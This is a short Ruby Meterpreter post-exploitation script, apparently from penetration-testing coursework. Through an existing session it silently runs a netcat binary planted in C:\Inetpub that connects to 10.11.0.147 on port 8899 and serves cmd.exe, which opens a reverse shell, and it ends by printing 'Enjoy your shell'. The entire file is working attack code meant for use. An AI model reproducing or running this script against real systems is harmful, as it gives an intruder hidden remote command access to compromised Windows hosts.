def execution(session, cmd)
  print_status("Author: _amonsec")
  print_status("Running nc callback ...")
  
  # Init
  r = ''
  session.response_timeout = 120
  
  # Try / catching cmd execution
  begin
    print_status("Command: #{cmd}")
    r = session.sys.process.execute(
      "cmd.exe /c #{cmd}",
      nil,
      {'Hidden' => true, 'Channelized' => true})
    d = r.channel.read
    print_status("\t#{d}")

    # Close 
    r.channel.close
    r.close

    print_status("Enjoy your shell: ¯\_(ツ)_/¯")
  rescue ::Exception => e
    print_error("Error Running command #{cmd}: #{e.class} #{e}")
  end
end

# To change
location = "C:\\Inetpub\\nc.exe"
lhost = "10.11.0.147"
lport = 8899
toExecute = "cmd.exe"

# Generate the command
command = "#{location} -nv #{lhost} #{lport} -e #{toExecute}"

execution(client, command)
